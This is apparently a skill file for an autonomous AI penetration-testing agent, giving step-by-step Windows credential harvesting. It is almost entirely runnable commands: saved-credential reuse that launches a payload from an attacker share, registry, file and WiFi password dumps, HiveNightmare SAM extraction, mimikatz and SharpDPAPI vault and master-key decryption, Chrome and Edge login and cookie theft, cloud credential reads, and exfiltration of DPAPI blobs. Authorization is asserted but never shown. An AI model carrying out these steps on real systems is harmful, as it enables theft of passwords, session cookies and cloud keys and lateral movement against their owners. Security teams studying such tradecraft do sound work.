---
name: windows-credential-harvesting
description: >
  Harvest stored credentials from a Windows system for privilege escalation or
  lateral movement.
keywords:
  - credential harvesting
  - DPAPI
  - HiveNightmare
  - stored credentials
  - password hunting
  - credential vault
  - browser passwords
  - registry passwords
  - cmdkey
  - SharpDPAPI
  - unattend.xml
tools:
  - SharpDPAPI
  - mimikatz
  - SharpChrome
  - SessionGopher
  - dpapi.py
  - secretsdump.py
opsec: low
---

# Windows Credential Harvesting

You are helping a penetration tester find and extract locally stored credentials on a
Windows system. This covers file-based, registry-based, and DPAPI-protected secrets.
All testing is under explicit written authorization.

**Scope distinction:** This skill covers LOCAL credential discovery — passwords in files,
registry, vaults, browsers, DPAPI blobs, and shadow copies. For AD-level extraction
(DCSync, NTDS.dit, LAPS, gMSA, DSRM), use **credential-dumping** instead.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[windows-credential-harvesting] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).

## State Management

Call `get_state_summary()` from the state-reader MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)

## Prerequisites

- Shell access on a Windows system (cmd.exe, PowerShell, or webshell)
- Current user context known (`whoami`)
- Higher access level unlocks more techniques (admin → SAM, DPAPI machine keys)

## Step 1: Quick Wins (No Admin Required)

Start with techniques that work at any privilege level. These often yield immediate
results with minimal detection.

### Saved Credentials (cmdkey)

```cmd
cmdkey /list
```

If entries exist, use them:

```cmd
runas /savecred /user:DOMAIN\admin cmd.exe
runas /savecred /user:administrator "\\ATTACKER\share\payload.exe"
```

### Registry Autologon

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultUserName DefaultDomainName DefaultPassword"
```

### PowerShell History

```cmd
type %USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

```powershell
# Search all users (if readable)
Get-ChildItem C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt -ErrorAction SilentlyContinue | ForEach-Object {
    Write-Host "`n=== $($_.FullName) ===" -ForegroundColor Yellow
    Select-String -Path $_ -Pattern "passw|cred|secret|key|token|login" -Context 1,1
}
```

### PowerShell Transcripts

```powershell
# Check common transcript locations
Get-ChildItem C:\Transcripts\ -Recurse -ErrorAction SilentlyContinue
Get-ChildItem C:\Users\*\Documents\PowerShell_transcript* -ErrorAction SilentlyContinue
```

### Unattend / Sysprep Files

```cmd
dir /s /b C:\*unattend.xml C:\*sysprep.xml C:\*sysprep.inf 2>nul
type C:\Windows\Panther\Unattend.xml 2>nul | findstr /i "password"
type C:\Windows\Panther\Unattend\Unattend.xml 2>nul | findstr /i "password"
type C:\Windows\system32\sysprep\sysprep.xml 2>nul | findstr /i "password"
```

Passwords in unattend files are often base64-encoded:

```bash
echo "U2VjcmV0UGFzc3dvcmQxMjM=" | base64 -d
```

```powershell
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjcmV0UGFzc3dvcmQxMjM="))
```

### Registry Password Search

```cmd
reg query HKLM /F "password" /t REG_SZ /S /K 2>nul | findstr /i "password"
reg query HKCU /F "password" /t REG_SZ /S /K 2>nul | findstr /i "password"
```

### PuTTY / SSH Saved Sessions

```cmd
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
reg query "HKCU\Software\OpenSSH\Agent\Keys"
```

### WiFi Passwords

```cmd
netsh wlan show profile
netsh wlan show profile <SSID> key=clear
```

One-liner to dump all WiFi passwords:

```cmd
for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off >nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on
```

### IIS Web.config

```powershell
Get-ChildItem -Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config 2>nul | findstr /i "connectionString password"
```

### Credential File Search

```cmd
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt *.config 2>nul
dir /S /B *pass*.txt *pass*.xml *pass*.ini *cred* *vnc* *.config* 2>nul
findstr /spin "password" *.* 2>nul
```

### SessionGopher (All Saved Sessions)

```powershell
Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
```

Extracts: PuTTY, WinSCP, SuperPuTTY, FileZilla, RDP saved sessions.

## Step 2: HiveNightmare / SAM Shadow Copy (CVE-2021-36934)

Check if the SAM hive is readable by non-admin users due to misconfigured ACLs.

### Detection

```cmd
icacls C:\Windows\System32\config\SAM
```

Vulnerable if output includes `BUILTIN\Users:(I)(RX)`.

### Exploitation

```cmd
:: List available shadow copies
vssadmin list shadows
```

```powershell
# Extract via mimikatz shadow copy access
mimikatz# misc::shadowcopies
mimikatz# lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM

# Also extract SECURITY hive for LSA secrets
mimikatz# lsadump::secrets /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /security:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY
```

**Alternative — map shadow copy and extract offline:**

```cmd
mklink /d C:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
copy C:\shadowcopy\Windows\System32\config\SAM C:\Windows\Temp\SAM
copy C:\shadowcopy\Windows\System32\config\SYSTEM C:\Windows\Temp\SYSTEM
```

```bash
# Offline extraction (attacker machine)
secretsdump.py -sam SAM -system SYSTEM LOCAL
# Or: samdump2 SYSTEM SAM
# Or: pwdump SYSTEM SAM
```

### Backup Hive Locations

Also check these paths for SAM/SYSTEM copies:

```
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\RegBack\system
```

## Step 3: DPAPI Extraction

DPAPI (Data Protection API) encrypts credentials, vault entries, browser passwords,
and other secrets using keys derived from the user's password. Decrypting DPAPI
requires either the user's password/NTLM hash, LSASS memory, or the domain backup key.

### Locate DPAPI Blobs

```powershell
# Master keys
Get-ChildItem -Hidden C:\Users\*\AppData\Roaming\Microsoft\Protect\ -Recurse
Get-ChildItem -Hidden C:\Users\*\AppData\Local\Microsoft\Protect\ -Recurse

# Credential blobs
Get-ChildItem -Hidden C:\Users\*\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\*\AppData\Roaming\Microsoft\Credentials\

# Vault files
Get-ChildItem -Hidden C:\Users\*\AppData\Local\Microsoft\Vault\
Get-ChildItem -Hidden C:\Users\*\AppData\Roaming\Microsoft\Vault\
```

### Decrypt (Current User Session — Easiest)

If running as the target user, DPAPI automatically uses the loaded master key:

```powershell
# SharpDPAPI — decrypt everything accessible in current user context
SharpDPAPI.exe triage /unprotect
SharpDPAPI.exe credentials /unprotect
SharpDPAPI.exe vaults /unprotect
SharpDPAPI.exe rdg /unprotect
```

```powershell
# Mimikatz — in-session decryption
mimikatz# dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\<GUID> /unprotect
```

### Decrypt (Known Password or NTLM Hash)

```bash
# SharpDPAPI — with password
SharpDPAPI.exe masterkeys /password:PASSWORD
SharpDPAPI.exe triage /password:PASSWORD

# SharpDPAPI — with NTLM hash
SharpDPAPI.exe masterkeys /ntlm:NTLM_HASH

# Mimikatz — decrypt master key with password
mimikatz# dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}\{GUID}" /sid:S-1-5-21-...-1107 /password:PASSWORD /protected
# Then use the master key to decrypt blobs
mimikatz# dpapi::cred /in:C:\path\to\credential /masterkey:MASTERKEY_HEX
```

```bash
# Impacket dpapi.py (offline)
python3 dpapi.py masterkey -file {GUID} -sid S-1-5-21-...-1107 -password 'Password!'
python3 dpapi.py credential -file CREDENTIAL_BLOB -key 0xMASTERKEY_HEX
```

### Decrypt (RPC to Domain Controller — Domain-Joined)

If the user is currently logged in on a domain-joined machine:

```powershell
# SharpDPAPI — RPC call to DC for master key decryption
SharpDPAPI.exe masterkeys /rpc
SharpDPAPI.exe triage /rpc

# Mimikatz
mimikatz# dpapi::masterkey /in:"C:\...\{GUID}" /rpc
```

### Decrypt (Domain Backup Key — Domain Admin)

With domain admin access, extract the DPAPI backup key to decrypt any user's master keys:

```bash
# Extract domain backup key
SharpDPAPI.exe backupkey /server:DC01.domain.local /file:key.pvk

# Mimikatz
mimikatz# lsadump::backupkeys /system:DC01.domain.local /export

# Then decrypt any user's credentials with the backup key
SharpDPAPI.exe triage /pvk:key.pvk
SharpDPAPI.exe credentials /server:TARGET /pvk:key.pvk
```

### Decrypt (LSASS Memory — Local Admin)

```powershell
# Extract DPAPI keys from LSASS
mimikatz# sekurlsa::dpapi

# Use the prekey from LSASS dump
SharpDPAPI.exe triage /prekey:SHA1_HEX
```

### DPAPI Machine Keys (Local Admin)

For machine-scoped DPAPI (e.g., scheduled task credentials, service account creds):

```powershell
# Extract machine DPAPI key from LSA secrets
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv

# Offline extraction
mimikatz# lsadump::secrets /system:system.hiv /security:security.hiv
```

### Offline DPAPI Master Key Extraction

If you have master key files but not the password, extract the hash for offline
cracking:

```bash
# Extract hashcat-format hashes from master keys
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\{SID} --mode hashcat --outfile engagement/evidence/dpapi-masterkey-bob.hc
```

**Do NOT crack hashes in this skill.** Save the DPAPI master key hash to
`engagement/evidence/` and return to the orchestrator with the hash file path,
hash type (DPAPI masterkey / hashcat mode 15900), and a routing recommendation
to **credential-cracking**.

## Step 4: Browser Credentials

### Chrome / Edge (Chromium-based — DPAPI encrypted)

```powershell
# SharpChrome — interactive (current user session)
SharpChrome.exe logins /browser:chrome /unprotect
SharpChrome.exe logins /browser:edge /unprotect
SharpChrome.exe cookies /browser:chrome /format:csv /unprotect

# Offline workflow — extract state key, then decrypt
SharpChrome.exe statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Use the hex statekey output to decrypt cookies offline
SharpChrome.exe cookies /target:"C:\Users\bob\...\Default\Cookies" /statekey:STATEKEY_HEX /format:json

# Remote with domain backup key
SharpChrome.exe logins /server:HOST01 /browser:chrome /pvk:key.pvk
SharpChrome.exe cookies /server:HOST01 /browser:edge /pvk:BASE64

# With DPAPI prekey from LSASS dump
SharpChrome.exe logins /browser:edge /prekey:SHA1_HEX
```

**Chrome/Edge file locations:**

```
C:\Users\<USER>\AppData\Local\Google\Chrome\User Data\Default\Login Data
C:\Users\<USER>\AppData\Local\Google\Chrome\User Data\Local State
C:\Users\<USER>\AppData\Local\Microsoft\Edge\User Data\Default\Login Data
```

### Firefox (NSS encrypted — no DPAPI)

```
C:\Users\<USER>\AppData\Roaming\Mozilla\Firefox\Profiles\<PROFILE>\key4.db
C:\Users\<USER>\AppData\Roaming\Mozilla\Firefox\Profiles\<PROFILE>\logins.json
```

Tools: `SharpWeb`, `firefox_decrypt.py`, `firepwd.py`.

### Mimikatz Chrome Decryption

```powershell
mimikatz# dpapi::chrome /in:"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" /unprotect
```

## Step 5: Additional Credential Sources

### Credential Manager / Vault (Detailed)

```cmd
:: List vault entries
vaultcmd /listcreds:"Windows Credentials" /all
vaultcmd /listcreds:"Web Credentials" /all
```

```powershell
# Mimikatz vault dumping
mimikatz# vault::list
mimikatz# vault::cred /patch
```

### Sticky Notes

```powershell
# SQLite database — may contain passwords in notes
$db = "C:\Users\$env:USERNAME\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite"
if (Test-Path $db) { Write-Host "Sticky Notes DB found: $db" }
```

Copy and open with any SQLite viewer — notes stored in plaintext.

### VNC Passwords

```cmd
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v password
```

VNC passwords are DES-encrypted with a fixed key — trivially decryptable.

### McAfee SiteList.xml

```cmd
dir /s /b "C:\ProgramData\McAfee\*SiteList*" 2>nul
dir /s /b "C:\Program Files\McAfee\*SiteList*" 2>nul
```

May contain encrypted repository credentials.

### Cloud Credential Files

```powershell
# AWS
Test-Path "$env:USERPROFILE\.aws\credentials"
type "$env:USERPROFILE\.aws\credentials" 2>nul

# Azure
Test-Path "$env:USERPROFILE\.azure"
dir "$env:USERPROFILE\.azure" 2>nul

# GCP
Test-Path "$env:APPDATA\gcloud\credentials.db"

# Kubernetes
Test-Path "$env:USERPROFILE\.kube\config"
type "$env:USERPROFILE\.kube\config" 2>nul | findstr /i "password token"
```

### Alternate Data Streams

```powershell
# Check for hidden data streams
Get-Item -Path C:\Users\*\Desktop\* -Stream * -ErrorAction SilentlyContinue | Where-Object { $_.Stream -ne ':$DATA' }
# Read a specific stream
Get-Content -Path file.txt -Stream HiddenStream
```

## Step 6: Escalate or Pivot

STOP and return to the orchestrator with:
- What was achieved (RCE, creds, file read, etc.)
- New credentials, access, or pivot paths discovered
- Context for next steps (platform, access method, working payloads)

## Troubleshooting

### SharpDPAPI "Cannot decrypt master key"
The master key is protected by the user's password. You need either: (1) the user's
plaintext password or NTLM hash, (2) access to LSASS memory (local admin), (3) the
domain backup key (domain admin), or (4) to run as the target user (in-session).

### HiveNightmare — no shadow copies available
The vulnerability requires existing volume shadow copies. Check with
`vssadmin list shadows`. If none exist, this path is not exploitable without creating
one (requires admin).

### Chrome "Login Data" locked by Chrome process
Copy the file to a temp location before reading:
```cmd
copy "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" C:\Windows\Temp\LoginData
```

### DPAPI blobs found but no way to decrypt
Exfiltrate the master key files and credential blobs to the attacker machine.
Use `DPAPISnoop` to generate hashcat-format hashes (mode 15900), save to
`engagement/evidence/`, and route to **credential-cracking**.

### "Access Denied" on other users' profiles
Without admin access, you can only harvest credentials from the current user's profile.
Escalate first via **windows-uac-bypass** or **windows-token-impersonation**, then
re-run harvesting.
